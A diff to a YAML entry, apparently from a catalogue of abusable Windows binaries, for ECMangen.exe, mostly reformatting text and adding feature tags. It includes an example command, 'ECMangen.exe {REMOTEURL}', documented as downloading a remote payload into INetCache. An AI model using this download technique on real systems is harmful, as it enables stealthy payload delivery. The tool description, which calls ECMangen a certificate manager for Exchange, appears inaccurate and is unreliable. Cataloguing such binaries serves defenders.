@@ -2,7 +2,10 @@
 id: windows-download-ecmangen
 namespace: windows:download:ecmangen
 name: ecmangen
-description: 'Command-line tool for managing certificates in Microsoft Exchange Server. Located at: C:\Program Files (x86)\Microsoft SDKs\Windows\<version>\Bin\ECMangen.exe; C:\Program Files (x86)\Microsoft SDKs\Windows\<version>\Bin\x64\ECMangen.exe; C:\Program Files\Microsoft\Exchange Server\<version>\Bin\ECMangen.exe.'
+description: 'Command-line tool for managing certificates in Microsoft Exchange Server.
+  Located at: C:\Program Files (x86)\Microsoft SDKs\Windows\<version>\Bin\ECMangen.exe;
+  C:\Program Files (x86)\Microsoft SDKs\Windows\<version>\Bin\x64\ECMangen.exe; C:\Program
+  Files\Microsoft\Exchange Server\<version>\Bin\ECMangen.exe.'
 author: Avihay Eldad
 version: 1.0.0
 capabilities:
@@ -41,7 +44,13 @@ resource_profile:
 allowed-tools:
 - ecmangen
 parameters: []
-features: []
+features:
+- encryption
+- file-system
+- local
+- network-intensive
+- pipes-stdout
+- remote
 execution:
   template: ecmangen
   sandbox: execFile
@@ -49,7 +58,8 @@ execution:
   shell: false
 global_vars: {}
 examples:
-- description: Downloads payload from remote server (It will download a remote payload and place it in INetCache)
+- description: Downloads payload from remote server (It will download a remote payload
+    and place it in INetCache)
   command: ECMangen.exe {REMOTEURL}
 references: []
 techniques:
@@ -67,7 +77,6 @@ install:
   commands:
   - choco install ecmangen
 ---
-
 
 # ecmangen
 
